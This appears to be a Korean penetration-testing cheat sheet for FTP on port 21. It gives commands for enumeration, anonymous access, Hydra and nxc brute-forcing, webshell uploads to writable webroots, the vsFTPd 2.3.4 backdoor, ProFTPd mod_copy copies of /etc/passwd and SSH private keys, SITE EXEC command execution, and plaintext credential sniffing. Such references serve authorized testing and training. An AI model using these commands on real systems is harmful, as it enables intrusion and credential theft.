# FTP (21)

File Transfer Protocol. 인증 정보가 평문으로 전송되며, 종종 Anonymous 로그인이 허용된다.

---

## 열거

```bash
# 배너 및 버전
nmap -sV -sC -p 21 TARGET
nc -nv TARGET 21

# Anonymous 로그인 확인
ftp TARGET
> Name: anonymous
> Password: (빈 값 또는 아무 이메일)

# nmap NSE
nmap --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p 21 TARGET
```

---

## Anonymous 접근

```bash
ftp TARGET
> Name: anonymous
> Password:
ftp> ls -la
ftp> cd directory
ftp> get filename
ftp> mget *
ftp> put localfile

# 재귀 download
wget -m ftp://anonymous:@TARGET/
wget -m --no-passive ftp://anonymous:@TARGET/
```

---

## 인증 공격

```bash
# Hydra
hydra -l user -P passwords.txt ftp://TARGET -t 10

# nxc
nxc ftp TARGET -u users.txt -p passwords.txt
```

---

## 공격

### 쓰기 가능한 FTP

```bash
# 웹루트와 연결된 FTP에 webshell upload
ftp> put webshell.php
ftp> put cmd.aspx

# 일반적인 웹루트 경로
# /var/www/html/  (Linux)
# C:\inetpub\wwwroot\  (Windows IIS)
```

### 알려진 취약점

```bash
# vsFTPd 2.3.4 Backdoor
nmap --script=ftp-vsftpd-backdoor -p 21 TARGET
# 포트 6200에 백도어 shell binding

# ProFTPd 1.3.3c - mod_copy
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt

# ProFTPd mod_copy로 SSH 키 탈취
SITE CPFR /home/user/.ssh/id_rsa
SITE CPTO /var/www/html/id_rsa
```

### FTP Bounce Attack

```bash
# FTP 서버를 통한 포트 스캔 (NAT/방화벽 우회)
nmap -b user:pass@FTP_SERVER TARGET
```

---

## 유용한 FTP 명령어

```text
binary    # binary 모드 (파일 손상 방지)
passive   # Passive 모드 (방화벽 문제 시)
prompt    # 대화형 확인 토글
mget *    # 모든 파일 download
mput *    # 모든 파일 upload
ls -la    # 숨겨진 파일 포함 목록
```

---

## FTPS / FTP over TLS

FTP 위에 TLS 를 얹은 형태. 보통 21(Explicit FTPS) 또는 990(Implicit FTPS).

```bash
# Explicit FTPS (AUTH TLS)
lftp -u user,pass ftps://TARGET:21

# Implicit FTPS
lftp -u user,pass ftps://TARGET:990

# 인증서 검증 건너뛰기 (자체 서명)
lftp -e 'set ssl:verify-certificate no' -u user,pass ftps://TARGET

# curl
curl -k --ssl-reqd -u user:pass ftp://TARGET/
```

---

## lftp 고급 사용

`ftp` 보다 스크립트 친화적이고 재귀 업/다운 지원.

```bash
# 익명 재귀 미러
lftp -e "set ftp:anon-pass ''; mirror --parallel=5 / /tmp/loot; bye" anonymous@TARGET

# credential + upload
lftp -u user,pass TARGET -e "mirror -R /local /remote; bye"

# 사이트 명령(원격 shell 명령 - ProFTPd 등 일부 서버)
lftp -u user,pass TARGET -e "quote SITE EXEC id; bye"
```

---

## curl one-liner

```bash
# directory 리스팅
curl -s ftp://anonymous:@TARGET/

# 파일 가져오기
curl -u user:pass ftp://TARGET/file -o file

# upload
curl -T webshell.php -u user:pass ftp://TARGET/

# credential 유출 감시 (평문)
tcpdump -i any -A -s0 'tcp port 21' | grep -iE 'USER|PASS'
```

---

## 유의사항

!!! warning "평문 전송"
    일반 FTP(21) 는 credential/데이터를 평문 전송한다. 동일 L2 구간이면 `tcpdump` / `ettercap` 으로 스니핑 가능.

!!! tip "쓰기 directory 탐색"
    `put test.txt` → `quote SITE CHMOD 777 test.txt` 로 쓰기 가능한 경로를 빠르게 확인. 웹루트와 오버랩되는지(`/var/www/html`, `wwwroot`) 확인 우선.
